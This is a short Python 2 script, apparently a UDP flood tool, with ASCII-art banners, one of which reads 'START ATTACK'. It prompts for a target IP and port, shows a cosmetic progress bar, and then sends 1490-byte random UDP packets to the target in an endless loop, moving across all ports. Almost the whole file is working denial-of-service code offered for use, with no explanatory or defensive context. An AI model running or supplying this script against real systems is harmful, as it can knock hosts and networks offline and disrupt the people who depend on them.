print('''\033[36m
  ____                        
 / ___| _   _ _ __  _ __ __ _ 
 \___ \| | | | '_ \| '__/ _` |
  ___) | |_| | |_) | | | (_| |
 |____/ \__,_| .__/|_|  \__,_|
             |_|              

             
''')


import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

ip = raw_input(" \033[35mEnter the ip  : ")
port = input(" Enter the port : ")
os.system("clear")
print ('''\033[1;36m
___  ____ ___  ____ ____   ___  ____ ____ ___  ____ __ _
| _\ |_ _\|  \ | . \|_ _\  |  \ |_ _\|_ _\|  \ | __\| V \
[__ \  || | . \|  <_  ||   | . \  ||   || | . \| \__|  <_
|___/  |/ |/\_/|/\_/  |/   |/\_/  |/   |/ |/\_/|___/|/\_/
''')
print('\033[35m')
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(2)
print "[==========          ] 50%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(2)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:

     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
